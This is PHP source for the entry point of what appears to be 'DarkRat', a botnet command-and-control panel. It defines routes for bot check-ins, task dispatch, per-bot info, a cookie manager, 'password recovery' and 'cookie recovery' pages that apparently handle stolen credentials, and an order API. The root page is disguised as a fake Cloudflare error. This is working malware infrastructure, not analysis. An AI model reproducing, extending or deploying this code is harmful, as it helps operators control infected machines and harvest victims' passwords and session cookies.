<?php

session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$installer = true;
$loadedVersion = "2.0";


$navigation = array();
if (file_exists(__DIR__ . '/../../config.php')) {
    $installer = false;
    require_once __DIR__ . '/../../config.php';
}



function register_navigation_tab($name,$iconPath){
    $GLOBALS["navigation"][$name] = $iconPath;
}

function get_plugin_base_dir($pluginName){
    return $GLOBALS["foundPlugins"][$pluginName]["plugindir"];
}

function get_plugin_include_dir($pluginName){
    return $GLOBALS["foundPlugins"][$pluginName]["includeDir"];
}




require 'vendor/autoload.php';
require_once __DIR__ . '/src/Classes/Bramus/Router/Router.php';
//require_once __DIR__ . '/src/Classes/DarkRat/PluginBase.php';
require __DIR__ . '/src/Classes/Smarty/Smarty.class.php';
require __DIR__ . '/src/Controllers/Public/BotHandler.class.php';
require __DIR__ . '/src/Controllers/Public/Install.class.php';
require __DIR__ . '/src/Controllers/Public/Update.class.php';
require __DIR__ . '/src/Controllers/Public/Recovery.class.php';
require __DIR__ . '/src/Controllers/Public/OrderApi.class.php';

$tpl = new Smarty;
$router = new \Bramus\Router\Router();



$statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
$statementConfig->execute(array("1"));
$config = $statementConfig->fetch();


if (!$installer) {
    require __DIR__ . '/src/Controllers/Public/Main.class.php';
    $router->all('/login', 'Main@login');
    $router->all('/', 'FakeErrors@cloudflare');
    $router->all('/request', 'BotHandler@request');

    $router->all('/dashboard', 'Main@index');
    $router->all('/tasks', 'Main@tasks');
    $router->all('/tasks/(\d+)', 'Main@tasks');
    $router->all('/logout', 'Main@logout');
    $router->all('/settings', 'Main@settings');
    //$router->all('/passrecovery', 'Main@passrecovery');
    $router->all('/bots', 'Main@bots');
    $router->all('/taskdetails/(\d+)', 'Main@taskdetails');
    $router->all('/edituser/(\d+)', 'Main@edituser');
    $router->all('/botinfo/(\d+)', 'Main@botinfo');
    $router->all('/cookiemanager/(\d+)', 'Main@cookiemanager');
    $router->all('/version_check', 'Update@version_check');
    $router->all('/doUpdate', 'Update@doUpdate');
    $router->all('/passwordrecovery', 'Recovery@passwordrecovery');
    $router->all('/cookierecovery', 'Recovery@cookierecovery');
    $router->all('/checkfunctions', 'OrderApi@checkFunctions');
    $router->all('/createoder', 'OrderApi@createoder');
    $router->all('/checkorder', 'OrderApi@checkorder');
    $router->all('/detils', 'OrderApi@detils');

} else {
    $router->all('/install', 'install@index');
}



$foundPlugins = array();
foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginName){

    $foundPlugins[$pluginName] = array(
        "name" => $pluginName,
        "includeDir" => "/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/",
        "active" =>(strpos($config["plugins"], $pluginName) != false) ? "1" : "0",
    );

    if($foundPlugins[$pluginName]["active"] == "1"){
        include(__DIR__."/plugins/".$pluginName."/".$pluginName.".php");
    }
}



$template = explode("@", $router->fn);




$router->run(function () use ($tpl) {

    $tpl->caching = false;
    $tpl->compile_check = true;
    $tpl->force_compile = true;
    $tpl->setTemplateDir(__DIR__ . "/templates/".$GLOBALS["config"]["template"]."/");
    $templateDir = $GLOBALS["template"][0] . "/" . $GLOBALS["template"][1] . ".tpl";
    $GLOBALS["tpl"]->assign("includeDir", "/versions/".$GLOBALS["loadedVersion"]."/templates/".$GLOBALS["config"]["template"]."/");
    $GLOBALS["tpl"]->assign("navRegistrations", $GLOBALS["navigation"]);
    $tpl->display($templateDir);
});

if ($installer) {

    /*
    if(!function_exists('apache_get_modules') && in_array('mod_rewrite', apache_get_modules()) == false){
        echo "Please Enable Apache Mod Rewrite (Enable .htaccess)";
        die();
    }
    */

    if ($_SERVER['REQUEST_URI'] != "/install") {
        Header("Location: /install");
    }
}

?>

